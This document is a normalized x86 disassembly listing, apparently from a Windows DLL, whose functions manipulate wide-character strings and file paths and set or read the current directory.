mov [ ebp - 0x14 ] 0x0
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x28 ]
push 0x1
push r--data
call sub_10005dc0
push 0xffffffff
push 0x0
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005cf0
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x68 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp - 0x28 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x60 ]
call sub_10008c70
add esp 0x18
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x60 ]
xor ecx ecx
push 0xffffffff
push ecx
mov eax [ eax ]
add eax 0x8
mov [ ebp - 0x40 ] cx
mov [ ebp - 0x30 ] 0x0
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x2c ] 0x0
push eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0x60 ]
mov esi [ eax ]
xor eax eax
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] ax
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x6
lea ecx [ ebp - 0x60 ]
call sub_100096c0
jmp r-xdata
mov [ esi + 0x1c ] 0x7
xor eax eax
mov [ esi + 0x18 ] 0x0
push esi
mov [ esi + 0x8 ] ax
call j_sub_1003f3e3#2
add esp 0x4
push [ esi + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x3
push [ ebp - 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
push 0x2
xor eax eax
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] 0x0
lea ecx [ ebp - 0x58 ]
push r--data
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
call sub_10009730
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x40 ]
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x58 ]
call sub_10005cf0
mov eax [ ebp - 0x60 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
cmp [ esi + 0x1c ] 0x8
lea eax [ esi + 0x8 ]
mov edi [ eax + 0x10 ]
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x28 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ebx [ ebp - 0x6c ]
xor eax eax
mov ecx ebx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] ax
lea eax [ ebp - 0x58 ]
push eax
call sub_10003980
mov [ ebp - 0x64 ] 0x1
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x44 ] 0x8
jb r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x58 ]
call sub_10005dc0
push 0xffffffff
lea eax [ esi + 0x8 ]
push 0x0
push eax
lea ecx [ ebp - 0x58 ]
call sub_10005cf0
mov esi [ esi ]
cmp esi [ ebp - 0x60 ]
jne r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] eax
mov [ ebp + 0x8 ] ax
mov [ ebp - 0x4 ] al
cmp [ ebp + 0x34 ] 0x8
jb r-xdata
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
xor ecx ecx
mov edi r--data
mov ebx 0x1
cmp edi ebx
cmovb ebx edi
test ebx ebx
je r-xdata
xor eax eax
mov [ ebp + 0x34 ] 0x7
mov [ ebp + 0x30 ] eax
mov [ ebp + 0x20 ] ax
mov eax ebx
push [ ebp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x4 ] 0xc
lea ecx [ ebp - 0x60 ]
call sub_100096c0
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
sete cl
test cl cl
jne r-xdata
cmp edi 0x1
jae r-xdata
movzx ecx [ edx ]
cmp cx [ edi ]
mov edi [ eax + 0x10 ]
sbb ecx ecx
and ecx 0xfffffffe
inc ecx
jmp r-xdata
add edx 0x2
add edi 0x2
dec ebx
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov [ ecx ] eax
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
dec [ ebp - 0x5c ]
cmp [ esi + 0x1c ] 0x8
jb r-xdata
cmp [ eax + 0x14 ] 0x8
mov ebx [ eax + 0x10 ]
jb r-xdata
xor ecx ecx
cmp edi 0x1
setne cl
or ecx 0xffffffff
jmp r-xdata
test ecx ecx
jne r-xdata
mov cx [ edx ]
cmp cx [ edi ]
jne r-xdata
mov edi [ eax + 0x10 ]
mov edi 0x2
cmp ebx edi
cmovb edi ebx
test edi edi
je r-xdata
mov eax [ eax ]
test ecx ecx
xor eax eax
mov edx r--data
lea ecx [ ecx ]
sete al
test al al
jne r-xdata
cmp ebx 0x2
jae r-xdata
movzx eax [ eax ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add eax 0x2
add edx 0x2
dec edi
jne r-xdata
mov esi [ ebp - 0x6c ]
xor eax eax
mov [ ebp - 0x64 ] 0x1
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov [ ebp - 0x4 ] 0x5
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
mov eax [ esi ]
cmp eax [ ebp - 0x60 ]
je r-xdata
xor eax eax
cmp ebx 0x2
setne al
or eax 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x4 ] 0x9
lea ecx [ ebp - 0x60 ]
call sub_100096c0
mov [ ebp - 0x4 ] 0x3
push [ ebp - 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi eax
cmp esi [ ebp - 0x60 ]
jne r-xdata
cmp [ eax + 0x1c ] 0x8
lea edx [ eax + 0x8 ]
mov edi [ edx + 0x10 ]
mov [ ebp - 0x68 ] edi
jb r-xdata
test eax eax
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ebx 0x2
cmp edi ebx
cmovb ebx edi
test ebx ebx
je r-xdata
mov edx [ edx ]
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov [ ebp - 0x4 ] al
cmp [ ebp + 0x34 ] 0x8
jb r-xdata
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
xor ecx ecx
mov edi r--data
nop
xor eax eax
mov [ ebp + 0x34 ] 0x7
mov [ ebp + 0x30 ] 0x0
mov [ ebp + 0x20 ] ax
mov eax esi
jmp r-xdata
push [ ebp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sete cl
test cl cl
jne r-xdata
cmp edi 0x2
jae r-xdata
movzx ecx [ edx ]
cmp cx [ edi ]
mov edi [ ebp - 0x68 ]
sbb ecx ecx
and ecx 0xfffffffe
inc ecx
jmp r-xdata
add edx 0x2
add edi 0x2
dec ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ eax ]
lea eax [ ebp - 0x70 ]
push esi
push eax
lea ecx [ ebp - 0x60 ]
call sub_10009520
jmp r-xdata
xor ecx ecx
cmp edi 0x2
setne cl
or ecx 0xffffffff
jmp r-xdata
test ecx ecx
jne r-xdata
mov cx [ edx ]
cmp cx [ edi ]
jne r-xdata
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x60 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
test ecx ecx
sub_10008c70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c7a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x4 ] 0x1
xor eax eax
push 0xffffffff
push eax
mov [ ebp - 0x28 ] ax
lea ecx [ ebp - 0x28 ]
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
call sub_10003a20
mov [ ebp - 0x4 ] 0x2
mov edi [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov esi [ ebp - 0x28 ]
cmp edi 0x2
jb r-xdata
xor ecx ecx
test edi edi
je r-xdata
cmp edx 0x8
lea eax [ ebp - 0x28 ]
cmovae eax esi
cmp [ eax ] 0x5c
jne r-xdata
xor esi esi
mov [ ebp - 0x78 ] 0x0
push esi
push esi
mov [ ebp - 0x74 ] esi
call sub_100097e0
mov ebx eax
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x18 ] esi
jbe r-xdata
lea ebx [ ecx + 0x5c ]
cmp edx 0x8
lea eax [ ebp - 0x28 ]
cmovae eax esi
cmp [ eax + 0x2 ] 0x5c
jne r-xdata
mov edi [ ebp - 0x84 ]
push 0x0
push 0x0
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
call sub_100097e0
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xc
mov [ edi ] ebx
mov [ ebp - 0x78 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x4 ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x80 ] 0x1
mov [ ebp - 0x4 ] 0xd
lea ecx [ ebp - 0x78 ]
call sub_100096c0
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x78 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
mov [ ebp - 0x7c ] 0x5c
lea esp [ esp ]
inc ecx
cmp ecx edi
jb r-xdata
cmp edx 0x8
lea eax [ ebp - 0x28 ]
cmovae eax esi
mov [ eax + ecx * 2 ] bx
mov edx [ ebp - 0x14 ]
mov edi [ ebp - 0x18 ]
mov esi [ ebp - 0x28 ]
push 0xffffffff
push 0x2
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10009440
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x28 ]
push eax
call sub_10003670
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x44 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
mov [ ebp - 0x4 ] al
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ ebp - 0x28 ]
push eax
push [ ebx + 0x4 ]
push ebx
call sub_100099d0
mov ecx eax
mov eax 0x7fffffe
sub eax esi
cmp eax 0x1
jb r-xdata
test edi edi
je r-xdata
cmp edx 0x8
lea eax [ ebp - 0x28 ]
cmovae eax esi
cmp [ eax + ecx * 2 ] 0x2f
jne r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov edi [ ebp - 0x18 ]
mov esi [ ebp - 0x28 ]
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
push [ ebp - 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
push r--data
call sub_1003c5be
inc esi
mov [ ebp - 0x74 ] esi
mov [ ebx + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0x7
mov [ eax ] ecx
xor eax eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
mov edi [ ebp - 0x18 ]
cmp edi 0x1
ja r-xdata
push edi
push 0x0
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10009440
mov [ ebp - 0x4 ] 0x8
push eax
push [ ebx + 0x4 ]
push ebx
call sub_10009910
mov ecx eax
mov eax 0x7fffffe
sub eax esi
cmp eax 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] 0x7
cmp [ ebp - 0x2c ] 0x8
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] ax
jae r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x28 ]
cmp edx 0x8
cmovae ecx [ ebp - 0x28 ]
dec edi
je r-xdata
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
cmovae eax [ ebp - 0x28 ]
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov [ ebx + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
mov [ eax ] ecx
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x5c ] 0x8
jb r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x4 ] 0xa
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] 0x9
mov [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0x30 ]
inc eax
je r-xdata
cmp edx 0x8
mov [ ebp - 0x18 ] edi
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
jmp r-xdata
lea eax [ edi + edi ]
push eax
lea eax [ ecx + 0x2 ]
push eax
push ecx
call sub_1003c640
mov edx [ ebp - 0x14 ]
add esp 0xc
mov [ ebp - 0x4 ] 0x6
xor eax eax
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
cmp [ ebp - 0x18 ] eax
ja r-xdata
xor eax eax
mov [ ebp - 0x5c ] 0x7
mov [ ebp - 0x70 ] ax
lea ecx [ ebp - 0x28 ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x60 ] 0x0
push eax
push 0x0
call sub_10003c80
jmp r-xdata
push [ ebp - 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x2c ] 0x8
jb r-xdata
add eax eax
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_1003c640
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x58 ] ax
mov [ ebp - 0x4 ] 0x7
push ecx
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10009600
mov edi eax
cmp edi 0xffffffff
je r-xdata
sub_100090e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c847
mov eax [ fs : 0x0 ]
push eax
mov eax 0x803c
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8044 ] esi
mov [ ebp - 0x803c ] 0x0
mov [ ebp - 0x4 ] 0x1
sub esp 0x18
mov ecx [ edi + 0x4 ]
mov eax esp
mov [ ebp - 0x8038 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
call sub_100085d0
add esp 0x18
test eax eax
je r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x8040 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x14 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x4 ] 0x1
call sub_10008500
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x28 ] 0x8
lea eax [ ebp + 0x14 ]
cmovae eax [ ebp + 0x14 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x8038 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x14 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x1
call sub_100085d0
add esp 0x18
test eax eax
jne r-xdata
push 0x8008
lea eax [ ebp - 0x801c ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
lea eax [ ebp - 0x801c ]
push eax
push 0x4004
call [ GetCurrentDirectoryW@IAT ]
lea eax [ ebp - 0x801c ]
mov ecx esi
push eax
call sub_10009370
mov [ edi + 0x8 ] 0x1
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] ax
mov [ ebp - 0x803c ] 0x1
mov [ ebp - 0x4 ] al
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
lea eax [ ebp + 0x14 ]
push eax
call sub_10003980
jmp r-xdata
sub esp 0x18
mov ecx esp
mov [ ebp - 0x8038 ] esp
push 0xffffffff
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x14 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x4 ] 0x1
call sub_10008670
add esp 0x18
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0x28 ] 0x7
mov [ ebp + 0x24 ] eax
mov [ ebp + 0x14 ] ax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x24
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp + 0x28 ] 0x8
jb r-xdata
mov [ ebp - 0x803c ] 0x1
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x8038 ] esp
push 0xffffffff
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x14 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x5
sub esp 0x18
mov ecx [ edi + 0x4 ]
mov eax esp
mov [ ebp - 0x8040 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x8034 ]
call sub_10008700
add esp 0x30
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp + 0x14 ]
push eax
call sub_10003670
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x8034 ]
call sub_100036b0
sub_10009370
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ edx ] ax
jne r-xdata
mov ecx edx
push edi
lea edi [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
push ecx
push edx
mov ecx esi
call sub_10009730
mov eax esi
pop esi
pop ebp
retn 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edi
sar ecx 0x1
pop edi
push ecx
push edx
mov ecx esi
call sub_10009730
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100093d0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ edx ] 0x0
jne r-xdata
mov eax edx
push edi
lea edi [ eax + 0x2 ]
xor eax eax
push eax
push edx
call sub_10009730
pop esi
pop ebp
retn 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
mov ecx esi
pop edi
sar eax 0x1
push eax
push edx
call sub_10009730
pop esi
pop ebp
retn 0x4
sub_10009440
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c889
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ecx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_100094c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c8c0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_100096c0
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10009520
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
mov ebx ecx
push edi
mov edi [ ebp + 0xc ]
mov ecx [ ebx ]
cmp edi [ ecx ]
jne r-xdata
cmp edi eax
je r-xdata
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
pop edi
pop ebx
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0xc
push esi
mov ecx ebx
call sub_100096c0
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
pop edi
pop ebx
mov [ eax ] ecx
pop ebp
retn 0xc
xor eax eax
mov [ edi + 0x1c ] 0x7
mov [ edi + 0x18 ] 0x0
push edi
mov [ edi + 0x8 ] ax
call j_sub_1003f3e3#2
mov eax [ ebp + 0x10 ]
add esp 0x4
mov edi esi
mov [ ebp + 0xc ] edi
cmp esi eax
jne r-xdata
push [ edi + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi + 0x4 ]
mov esi [ edi ]
mov [ eax ] esi
mov ecx [ edi ]
mov eax [ edi + 0x4 ]
mov [ ecx + 0x4 ] eax
dec [ ebx + 0x4 ]
cmp [ edi + 0x1c ] 0x8
jb r-xdata
pop esi
sub_100095b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c8e8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
push [ ecx ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10009600
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ecx + 0x10 ]
mov [ ebp - 0x4 ] ecx
push esi
push edi
cmp eax ebx
jae r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub ebx eax
cmp ebx 0x1
jb r-xdata
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x8 ] edx
cmp edx 0x8
jb r-xdata
lea eax [ ecx + eax * 2 ]
mov ecx [ ecx ]
xor eax eax
mov edx [ ebp + 0x8 ]
mov ecx ebx
movzx edx [ edx ]
mov edx [ ebp + 0x8 ]
mov edi 0x1
mov esi eax
nop
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
movzx ecx [ esi ]
cmp cx [ edx ]
sbb ecx ecx
and ecx 0xfffffffe
inc ecx
je r-xdata
add esi 0x2
add edx 0x2
dec edi
jne r-xdata
cmp [ eax ] dx
je r-xdata
cmp [ ebp - 0x8 ] 0x8
mov ecx [ ebp - 0x4 ]
jb r-xdata
mov edx eax
or ecx 0xffffffff
sub edx [ ebp + 0xc ]
sar edx 0x1
sub ecx edx
add ebx ecx
add eax 0x2
jmp r-xdata
mov cx [ esi ]
cmp cx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
mov [ ebp + 0xc ] eax
test ebx ebx
je r-xdata
sub_100096c0
push ebx
mov ebx ecx
push esi
mov eax [ ebx ]
mov esi [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp esi [ ebx ]
je r-xdata
pop esi
pop ebx
retn
push edi
jmp r-xdata
cmp [ esi + 0x1c ] 0x8
mov edi [ esi ]
jb r-xdata
xor eax eax
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
push esi
mov [ esi + 0x8 ] ax
call j_sub_1003f3e3#2
add esp 0x4
mov esi edi
cmp edi [ ebx ]
jne r-xdata
push [ esi + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
pop edi
sub_10009730
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
push ebx
mov ebx [ ebp + 0xc ]
push ecx
push ebx
mov ecx esi
call sub_10003d30
test al al
je r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x8
jb r-xdata
cmp edi eax
jb r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
lea eax [ ebx + ebx ]
push eax
push edi
push ecx
call sub_1003dc80
